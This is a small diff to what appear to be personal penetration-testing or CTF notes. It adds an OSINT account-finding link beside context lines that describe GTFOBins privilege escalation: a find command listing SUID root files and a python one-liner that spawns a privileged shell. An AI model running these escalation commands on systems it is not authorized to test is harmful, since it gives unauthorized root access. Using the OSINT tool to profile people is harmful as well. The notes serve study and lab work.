@@ -45,7 +45,7 @@
 <span style="color:rgb(255, 255, 0)">GTFOBins</span>: sudo -l to check for possible bins, used to bypass local security and escalate privileges, we found a file with SUID permission using the command `find / -type f -user root -perm -u=s 2>/dev/null` and it was /usr/bin/python, so we executed `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` from the GTFOBins website to escalate privileges
 
 https://osintframework.com/
-
+https://www.idcrawl.com/: for OSINT to find accounts
 
 for timeline explorer
 ```
